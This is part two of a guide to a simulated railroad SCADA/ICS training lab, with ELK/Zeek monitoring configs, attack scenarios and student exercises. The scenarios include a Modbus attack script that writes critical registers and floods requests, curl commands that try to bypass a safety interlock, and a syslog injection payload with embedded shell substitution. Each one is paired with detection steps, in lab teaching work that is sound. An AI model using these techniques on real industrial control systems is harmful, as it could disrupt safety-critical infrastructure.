# Railroad North Lab - Part 2
## Monitoring, Logging, Security Scenarios & Training

---

## Monitoring & Logging Setup

### FILE: monitoring/logstash.conf

```
# Logstash configuration for Railroad North

input {
  # Syslog from collectors
  udp {
    port => 5001
    type => "railroad_syslog"
    add_field => { "input_source" => "syslog_udp" }
  }
  
  # TCP syslog
  tcp {
    port => 5000
    type => "railroad_syslog"
    add_field => { "input_source" => "syslog_tcp" }
  }
  
  # PLC logs from collector
  file {
    path => "/var/log/railroad/plc/*.log"
    start_position => "beginning"
    sincedb_path => "/tmp/sincedb_plc"
    type => "plc_log"
    add_field => { "input_source" => "plc_file" }
  }
  
  # IDS alerts
  file {
    path => "/var/log/zeek/logs/*.log"
    start_position => "beginning"
    sincedb_path => "/tmp/sincedb_ids"
    type => "ids_alert"
    add_field => { "input_source" => "ids_file" }
  }
}

filter {
  # Parse syslog
  if [type] == "railroad_syslog" {
    grok {
      match => { 
        "message" => "%{TIMESTAMP_ISO8601:timestamp} \[%{DATA:component}\] %{GREEDYDATA:log_message}"
      }
    }
    
    # Extract component type
    if [component] =~ /MASTER/ {
      mutate { add_tag => [ "master_plc" ] }
    }
    
    if [component] =~ /SLAVE-/ {
      grok {
        match => { "component" => "SLAVE-(?<slave_id>\d+)" }
      }
      mutate { add_tag => [ "slave_plc" ] }
    }
    
    # Flag critical events
    if [log_message] =~ /EMERGENCY|CRITICAL|REJECTED/ {
      mutate { add_tag => [ "critical_event" ] }
    }
    
    # Audit events
    if [log_message] =~ /DEVICE_CONTROL|SIGNAL_CHANGE|AUDIT/ {
      mutate { add_tag => [ "audit_event" ] }
    }
    
    # Parse device control events
    if [log_message] =~ /DEVICE_CONTROL/ {
      grok {
        match => { 
          "log_message" => "DEVICE_CONTROL: %{DATA:device_name} %{WORD:control_action}"
        }
      }
      mutate { add_tag => [ "device_control" ] }
    }
    
    # Parse route commands
    if [log_message] =~ /route/ {
      grok {
        match => { 
          "log_message" => ".*route.*(?<route>\w+)"
        }
      }
      mutate { add_tag => [ "route_command" ] }
    }
    
    # Date parsing
    date {
      match => [ "timestamp", "ISO8601" ]
      target => "@timestamp"
    }
  }
  
  # Parse PLC logs
  if [type] == "plc_log" {
    grok {
      match => { 
        "message" => "%{TIMESTAMP_ISO8601:timestamp} \[%{LOGLEVEL:level}\] %{GREEDYDATA:plc_message}"
      }
    }
    
    # Add system field
    mutate {
      add_field => { "system" => "plc" }
    }
  }
  
  # Parse IDS alerts
  if [type] == "ids_alert" {
    json {
      source => "message"
      target => "alert_data"
    }
    
    mutate {
      add_tag => [ "security_alert" ]
      add_field => { "system" => "ids" }
    }
  }
  
  # Generic processing
  mutate {
    add_field => { 
      "lab_environment" => "railroad_north"
      "environment" => "training"
      "processed_at" => "%{@timestamp}"
    }
  }
}

output {
  # All logs to Elasticsearch
  elasticsearch {
    hosts => ["elasticsearch:9200"]
    index => "railroad-%{+YYYY.MM.dd}"
    manage_template => false
  }
  
  # Critical events to alert index
  if "critical_event" in [tags] {
    elasticsearch {
      hosts => ["elasticsearch:9200"]
      index => "railroad-alerts-%{+YYYY.MM.dd}"
    }
  }
  
  # Audit events to audit index
  if "audit_event" in [tags] {
    elasticsearch {
      hosts => ["elasticsearch:9200"]
      index => "railroad-audit-%{+YYYY.MM.dd}"
    }
  }
  
  # Console output for debugging
  if [@metadata][debug] {
    stdout {
      codec => rubydebug
    }
  }
}
```

### FILE: monitoring/elasticsearch.yml

```yaml
cluster.name: "railroad-north"
node.name: "node-1"

# Network settings
network.host: 0.0.0.0
network.publish_host: elasticsearch

http.port: 9200
transport.port: 9300

# Discovery settings
discovery.type: single-node

# Index settings
action.auto_create_index: "+railr*,-.watch_*"

# Performance
index.number_of_shards: 1
index.number_of_replicas: 0

# Disable security for lab
xpack.security.enabled: false
xpack.ml.enabled: false
xpack.graph.enabled: false

# Logging
logger.level: info
logger.org.elasticsearch: WARN
```

### FILE: monitoring/zeek-rules.sig

```
# Zeek signature file for Railroad North

# Detect unauthorized Modbus TCP traffic
signature modbus-unauthorized-access {
  ip-proto == tcp
  dst-port == 502
  src-ip !in [172.25.0.0/16, 172.27.0.0/16]
  event "Unauthorized Modbus Access Attempt"
}

# Detect high-frequency Modbus reads (port scanning)
signature modbus-reconnaissance {
  ip-proto == tcp
  dst-port == 502
  tcp-state == syn
  threshold: type both, track by_src, count 10, seconds 60
  event "Potential Modbus Reconnaissance"
}

# Detect anomalous Modbus payload sizes
signature modbus-payload-anomaly {
  ip-proto == tcp
  dst-port == 502
  payload-size > 256
  event "Unusually Large Modbus Payload"
}

# Detect syslog tampering attempts
signature syslog-injection-attempt {
  ip-proto == udp
  dst-port == 514
  payload /.*; .*|.*`|.*\$\(.*\)/ 
  event "Potential Syslog Injection"
}

# Detect traffic to/from PLC from unauthorized sources
signature plc-unauthorized-source {
  ip-proto == tcp
  (dst-ip in [172.25.1.10, 172.25.2.10, 172.25.3.10])
  src-ip !in [172.25.0.0/16, 172.27.0.0/16]
  event "Unauthorized Source to Slave PLC"
}
```

### FILE: monitoring/syslog_collector.py

```python
#!/usr/bin/env python3
"""
Syslog Collector for Railroad North
Receives syslog messages from all components
"""

import asyncio
import logging
import os
import socket
from datetime import datetime

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s'
)
logger = logging.getLogger(__name__)

class SyslogCollector:
    def __init__(self, port=514, listen_ip='0.0.0.0'):
        self.port = port
        self.listen_ip = listen_ip
        self.message_count = 0
        self.last_sources = {}
        
        logger.info(f"Syslog Collector starting on {listen_ip}:{port}")
    
    async def handle_syslog(self, data, addr):
        """Handle incoming syslog message"""
        self.message_count += 1
        source_ip = addr[0]
        
        # Update last seen
        self.last_sources[source_ip] = datetime.now().isoformat()
        
        try:
            message = data.decode('utf-8').strip()
            logger.info(f"[{source_ip}] {message}")
            
            # Parse message
            if 'DEVICE_CONTROL' in message:
                logger.warning(f"[DEVICE_CONTROL] {message}")
            
            if 'EMERGENCY' in message or 'CRITICAL' in message:
                logger.error(f"[ALERT] {message}")
            
            if 'REJECTED' in message:
                logger.warning(f"[REJECTED] {message}")
            
        except Exception as e:
            logger.error(f"Error parsing syslog: {e}")
    
    async def start_server(self):
        """Start UDP syslog server"""
        logger.info("Starting UDP syslog server")
        
        # Create UDP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.listen_ip, self.port))
        sock.setblocking(False)
        
        loop = asyncio.get_event_loop()
        
        while True:
            try:
                data, addr = sock.recvfrom(1024)
                await self.handle_syslog(data, addr)
            except BlockingIOError:
                await asyncio.sleep(0.1)
            except Exception as e:
                logger.error(f"Server error: {e}")
    
    async def stats_reporter(self):
        """Report statistics"""
        while True:
            await asyncio.sleep(30)
            logger.info(f"Stats: {self.message_count} messages, {len(self.last_sources)} sources")

    async def run(self):
        """Run collector"""
        await asyncio.gather(
            self.start_server(),
            self.stats_reporter()
        )

if __name__ == '__main__':
    collector = SyslogCollector(
        port=int(os.environ.get('SYSLOG_PORT', 514)),
        listen_ip=os.environ.get('LISTEN_IP', '0.0.0.0')
    )
    
    try:
        asyncio.run(collector.run())
    except KeyboardInterrupt:
        logger.info("Syslog Collector stopped")
```

---

## Security Scenarios & Attacks

### SCENARIO 1: Unauthorized Track Switching

**Objective:** Detect unauthorized route change commands  
**Difficulty:** Medium  
**Duration:** 20 minutes

**Attack Steps:**
```bash
# 1. Attacker gains access to SCADA network
docker exec railroad-dmz-pentest curl -X POST \
  http://172.25.0.20:8080/api/command \
  -H "Content-Type: application/json" \
  -d '{"segment_id": 1, "route": "ROUTE_B"}'

# 2. Master PLC should validate and reject if conflicting
# 3. Check logs for audit trail

# 4. Multiple attempts in short time = reconnaissance
for i in {1..5}; do
  docker exec railroad-dmz-pentest curl -X POST \
    http://172.25.0.20:8080/api/command \
    -H "Content-Type: application/json" \
    -d '{"segment_id": 1, "route": "ROUTE_A"}'
done
```

**Detection:**
```sql
# Kibana search for unauthorized commands
POST logs-railroad-* /search
{
  "query": {
    "bool": {
      "must": [
        { "match": { "tags": "route_command" } },
        { "match": { "log_message": "REJECTED" } }
      ]
    }
  },
  "aggs": {
    "commands_by_source": {
      "terms": { "field": "source_ip.keyword" }
    }
  }
}
```

**Remediation:**
- Implement stronger authentication
- Add rate limiting to SCADA API
- Enable detailed logging of all commands
- Implement command signing

---

### SCENARIO 2: PLC Heartbeat Failure Simulation

**Objective:** Detect loss of slave PLC communication  
**Difficulty:** Easy  
**Duration:** 15 minutes

**Steps:**
```bash
# 1. Stop a slave PLC to simulate failure
docker stop railroad-slave-plc-2

# 2. Monitor master PLC logs
docker logs -f railroad-master-plc

# 3. Check that heartbeat failure is detected
# Expected: Emergency stop triggered

# 4. View in SCADA UI
# Should show segment 2 (Central) as FAULT
```

**Detection:**
```python
# Create Kibana dashboard alert
{
  "trigger": {
    "schedule": { "interval": "30s" }
  },
  "condition": {
    "compare": {
      "heartbeat_failure_count": { "gt": 0 }
    }
  },
  "actions": {
    "send_alert": {
      "webhook": "http://alert-system:8080/emergency"
    }
  }
}
```

---

### SCENARIO 3: Safety Interlock Bypass Attempt

**Objective:** Detect attempts to bypass safety rules  
**Difficulty:** Hard  
**Duration:** 30 minutes

**Attack:** Try to switch track while occupied
```bash
# 1. Set occupancy sensor to true (occupied)
docker exec railroad-slave-plc-1 python3 -c \
  "import requests; requests.post('http://localhost:8080/api/device/set', json={'device': 'occupancy_sensor', 'value': True})"

# 2. Attempt switch command
docker exec railroad-dmz-pentest curl -X POST \
  http://172.25.1.10:8080/api/device/switch \
  -H "Content-Type: application/json" \
  -d '{"switch_id": 1, "command": "ACTIVATE"}'

# 3. Master should REJECT due to occupied track
# 4. Check audit logs
```

**Expected Log:**
```
[REJECTED] Cannot activate switch 1: track occupied
[AUDIT] Unauthorized switch attempt from 172.27.0.20
[CRITICAL] Safety interlock rule 3 triggered
```

---

### SCENARIO 4: Modbus Protocol Manipulation

**Objective:** Detect malformed/abnormal Modbus traffic  
**Difficulty:** Advanced  
**Duration:** 45 minutes

**Attack Script:**

```python
# FILE: scripts/modbus-attack.py

#!/usr/bin/env python3
from pymodbus.client.sync import ModbusTcpClient
import time

# Connect to Master PLC
client = ModbusTcpClient('172.25.0.10', port=502)
client.connect()

# ATTACK 1: Read all registers at once (excessive data request)
print("[*] Attack 1: Excessive read request")
result = client.read_holding_registers(0, 1000)

# ATTACK 2: Write to critical register (setpoint)
print("[*] Attack 2: Write critical parameter")
client.write_register(10, 9999)

# ATTACK 3: Function code probe
print("[*] Attack 3: Unsupported function code")
# Send raw frame with invalid function code
request = b'\x00\x01\x00\x00\x00\x06\x01\xFF\x00\x00\x00\x01'
client.socket.send(request)

# ATTACK 4: Rapid fire requests
print("[*] Attack 4: Denial of Service")
for i in range(100):
    client.read_coils(0, 10)
    time.sleep(0.01)

client.close()
```

**Detection via IDS:**
```
Zeek would generate alerts:
- Excessive Modbus read request
- Multiple write operations to critical registers
- Unknown function codes
- Abnormal request frequency (potential DoS)
```

---

### SCENARIO 5: Syslog Injection Attack

**Objective:** Detect false syslog messages injected into logs  
**Difficulty:** Medium  
**Duration:** 25 minutes

**Attack:**
```bash
# Send malicious syslog message with injected content
docker exec railroad-dmz-pentest python3 << 'EOF'
import socket

# Craft malicious syslog
message = '2024-06-23T10:00:00Z [MASTER] " $(touch /tmp/pwned) # Everything OK'
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(message.encode(), ('172.25.0.40', 514))
sock.close()
EOF
```

**Detection:**
```
Logstash filter catches:
- Messages containing shell metacharacters: $(), ``, |, ;
- Unexpected command patterns in log content
- Timestamp inconsistencies
- Source IP spoofing attempts
```

---

## Training Lab Exercises

### LAB EXERCISE 1: System Architecture & Deployment

**Duration:** 120 minutes  
**Objective:** Deploy and understand the system

**Tasks:**
```
1. Deploy the railroad-north lab
   - docker-compose up -d
   - Verify all 15 containers running

2. Map the network topology
   - Identify all 3 networks (IT, DMZ, OT)
   - Document IP addresses of each component
   - Draw the communication flow

3. Access SCADA interface
   - Open http://localhost:8080
   - Verify Master PLC status
   - Check all 3 segments visible

4. Verify logging system
   - Send test syslog: logger -h 172.25.0.40 "TEST_MESSAGE"
   - Check Kibana: http://localhost:5601
   - Verify message appears in logs

5. Document in report
```

**Deliverables:**
- Network diagram with all components
- Screenshot of SCADA interface showing all segments
- Kibana dashboard with test logs
- List of all container IPs and purposes

---

### LAB EXERCISE 2: PLC Programming & Control

**Duration:** 150 minutes  
**Objective:** Understand master-slave coordination

**Tasks:**
```
1. Send route commands via SCADA
   - Change Segment 1 to Route A
   - Change Segment 2 to Route B
   - Observe Master PLC validation

2. Monitor Modbus traffic
   - Start tcpdump on SCADA container
   - Send commands
   - Capture Modbus frames
   - Analyze with Wireshark

3. Test safety interlocks
   - Try conflicting routes
   - Try switching while occupied
   - Observe rejection messages

4. Review command history
   - Access http://localhost:8080/api/status
   - Show accepted vs rejected commands
   - Explain validation logic

5. Modify PLC code
   - Add new safety rule to master_plc.py
   - Rebuild container
   - Test new rule
```

**Deliverables:**
- Modbus packet capture showing command sequences
- Screenshot of rejected command with reason
- Modified PLC code with new safety rule
- Test results showing rule enforcement

---

### LAB EXERCISE 3: Network Segmentation & Firewall Rules

**Duration:** 120 minutes  
**Objective:** Understand trust boundaries

**Tasks:**
```
1. Test current firewall rules
   - Attempt connection from IT network to OT network
   - Document what succeeds/fails
   - Verify DMZ mediation

2. Create firewall rules
   - Allow only Modbus (502) from DMZ to OT
   - Block all other ports
   - Test enforcement

3. Test segmentation
   - Verify IT cannot reach OT directly
   - Verify DMZ can reach both IT and OT
   - Verify OT cannot reach IT

4. Monitor blocked traffic
   - Enable firewall logging
   - Attempt unauthorized connections
   - Show blocked attempts in logs

5. Document rule set
```

**Firewall Rules Template:**
```
# IT → DMZ: Allow specific ports
ALLOW IT_NET to DMZ_NET tcp 22,3389,8080

# DMZ → OT: Allow only Modbus
ALLOW DMZ_NET to OT_NET tcp 502

# OT → DMZ: Deny (except syslog)
ALLOW OT_NET to DMZ_NET udp 514

# OT → OT: Allow all (internal)
ALLOW OT_NET to OT_NET all

# Default: Deny all
DENY all to all all
```

**Deliverables:**
- Firewall rule set (properly documented)
- Test results showing allowed/blocked traffic
- Screenshot of rule enforcement in action
- Network flow diagram with security boundaries

---

### LAB EXERCISE 4: Security Monitoring & Detection

**Duration:** 180 minutes  
**Objective:** Build detection rules

**Tasks:**
```
1. Establish baseline
   - Run normal operations for 10 minutes
   - Capture baseline logs
   - Document normal behavior:
     * Command rate
     * Message sizes
     * Source IPs
     * Protocol patterns

2. Implement detection rules
   - Create rule for unauthorized access attempts
   - Create rule for high-frequency commands
   - Create rule for malformed Modbus
   - Create rule for safety interlock violations

3. Test detection
   - Run each attack scenario
   - Verify rule triggers
   - Fine-tune thresholds

4. Create Kibana dashboards
   - Dashboard 1: System overview
   - Dashboard 2: Security events
   - Dashboard 3: Command history
   - Dashboard 4: Alert status

5. Document rules and tuning
```

**Kibana Search Examples:**

```json
# Find rejected commands
{
  "query": {
    "match": { "log_message": "REJECTED" }
  }
}

# Find commands from unauthorized sources
{
  "bool": {
    "must": [
      { "term": { "tags": "route_command" } },
      { "bool": {
          "must_not": [
            { "range": { "source_ip": [172.25.0.0, 172.27.0.0] } }
          ]
        }
      }
    ]
  }
}

# Find rapid-fire requests (potential DoS)
{
  "query": { "match": { "component": "MASTER" } },
  "aggs": {
    "requests_per_minute": {
      "date_histogram": {
        "field": "@timestamp",
        "interval": "minute",
        "min_doc_count": 100
      }
    }
  }
}
```

**Deliverables:**
- Baseline behavior report
- 4 custom detection rules (Kibana/ELK format)
- 4 Kibana dashboards with screenshots
- Test results showing rule accuracy
- False positive analysis and tuning

---

## Health Check & Management Scripts

### FILE: scripts/health-check.sh

```bash
#!/bin/bash

echo "╔═══════════════════════════════════════════════╗"
echo "║   Railroad North - System Health Check        ║"
echo "╚═══════════════════════════════════════════════╝"

# Check all containers
echo ""
echo "Container Status:"
docker-compose ps

# Check Master PLC
echo ""
echo "Master PLC Status:"
curl -s http://localhost:8080/health | jq '.' || echo "OFFLINE"

# Check Segments
echo ""
echo "Segment Status:"
curl -s http://localhost:8080/api/status | jq '.segments[] | {segment_id, name, state}' || echo "ERROR"

# Check Elasticsearch
echo ""
echo "Elasticsearch:"
curl -s http://localhost:9200/_cluster/health | jq '{status, active_shards, relocating_shards}' || echo "OFFLINE"

# Check Kibana
echo ""
echo "Kibana:"
curl -s http://localhost:5601/api/status | jq '.state' || echo "OFFLINE"

# Check syslog messages
echo ""
echo "Recent Syslog Messages:"
docker logs railroad-collector 2>/dev/null | tail -20 || echo "No logs"

# Network connectivity
echo ""
echo "Network Connectivity:"
docker exec railroad-master-plc ping -c 1 172.25.1.10 > /dev/null && echo "Master ↔ Slave1: ✓" || echo "Master ↔ Slave1: ✗"
docker exec railroad-scada ping -c 1 172.25.0.10 > /dev/null && echo "SCADA ↔ Master: ✓" || echo "SCADA ↔ Master: ✗"

# Resource usage
echo ""
echo "Resource Usage:"
docker stats --no-stream --format "table {{.Container}}\t{{.CPUPerc}}\t{{.MemUsage}}"
```

### FILE: scripts/reset-lab.sh

```bash
#!/bin/bash

echo "Resetting Railroad North Lab..."

# Stop all containers
docker-compose down -v

# Clean volumes
rm -rf volumes/*

# Remove old logs
rm -rf logs/*

# Recreate volumes
docker volume create railroad-master-plc-data
docker volume create railroad-slave-plc-1-data
docker volume create railroad-slave-plc-2-data
docker volume create railroad-slave-plc-3-data
docker volume create railroad-scada-data
docker volume create elasticsearch-data
docker volume create zeek-logs
docker volume create collector-logs

# Start fresh
docker-compose up -d

echo "Lab reset complete. Waiting for services..."
sleep 30
echo ""
bash scripts/health-check.sh
```

---

## Grading Rubric

### Exercise Evaluation Criteria

| Criteria | Points | Description |
|----------|--------|-------------|
| System Deployment | 25 | All components running, proper networking |
| Functionality | 25 | PLC control, routing, safety interlocks working |
| Documentation | 20 | Clear diagrams, explanations, screenshots |
| Security Understanding | 20 | Identifies threats, understands mitigations |
| Analysis & Troubleshooting | 10 | Explains issues, proposes solutions |

**Passing Score:** 70/100+

---

## Quick Reference

### Common Commands

```bash
# View all logs
docker-compose logs -f

# Access Master PLC API
curl http://localhost:8080/api/status

# Send test command
curl -X POST http://localhost:8080/api/command \
  -H "Content-Type: application/json" \
  -d '{"segment_id": 1, "route": "ROUTE_A"}'

# Monitor Modbus traffic
tcpdump -i docker0 -n port 502

# Check Elasticsearch
curl http://localhost:9200/_cat/indices

# Query logs
curl -X POST "http://localhost:9200/railroad-*/_search" \
  -H "Content-Type: application/json" \
  -d '{"query": {"match": {"log_message": "REJECTED"}}}'

# Reset single component
docker-compose down railroad-master-plc
docker-compose up -d railroad-master-plc
```

### Troubleshooting

| Issue | Solution |
|-------|----------|
| Containers won't start | Check resource limits, increase Docker memory |
| No logs in Kibana | Verify Elasticsearch is healthy, check Logstash |
| SCADA shows offline | Check Master PLC container, verify network |
| Modbus errors | Check firewall rules, verify IP connectivity |
| High CPU usage | Reduce log frequency, limit traffic generation |

---

**Version 2.0** | Complete Implementation Guide | June 2026
